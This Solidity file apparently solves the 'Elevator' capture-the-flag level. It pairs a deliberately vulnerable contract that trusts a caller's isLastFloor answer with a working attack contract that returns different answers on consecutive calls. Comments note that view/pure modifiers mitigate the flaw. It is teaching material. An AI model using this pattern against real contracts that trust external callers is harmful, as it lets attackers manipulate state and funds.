// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

contract ElevatorAttack is Building {
    uint256 public calls;

    function isLastFloor(uint256) external override returns (bool) {
        calls++;
        return calls > 1;
    }

    function attack(address elevator) external {
        Elevator(elevator).goTo(1);
    }
}

// You can use the view function modifier on an interface in order to prevent state modifications.
// The pure modifier also prevents functions from modifying the state.
// Make sure you read Solidity's documentation and learn its caveats.

// An alternative way to solve this level is to build a view function which returns
// different results depends on input data but don't modify state, e.g. gasleft().